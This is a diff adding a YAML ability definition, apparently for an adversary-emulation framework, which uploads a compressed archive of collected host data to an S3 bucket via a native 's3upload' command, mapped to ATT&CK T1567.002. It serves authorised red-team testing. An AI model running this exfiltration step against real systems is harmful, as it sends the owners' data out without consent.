@@ -1,0 +1,19 @@
+- id: dd4d3d6f-be0a-4d80-ada2-0b7f3228d2dc
+  name: Exfil Compressed Archive to S3 via Golang
+  description: |
+    Use the AWS SDK for GoLang to upload the compressed archive to the provided S3 bucket.
+    It is assumed that the current user credentials have the proper permissions to write to the target S3 bucket.
+    Requires the agent to be compiled with the native_aws extension.
+    Timeout set to 45 seconds.
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: 'Exfiltration to Cloud Storage'
+  platforms:
+    linux,windows,darwin:
+      native:
+        command: |
+          s3upload "#{host.dir.compress}" "#{s3.source.region}" "#{s3.source.name}" "aws-#{paw}-compressed" 45s
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.dir.compress
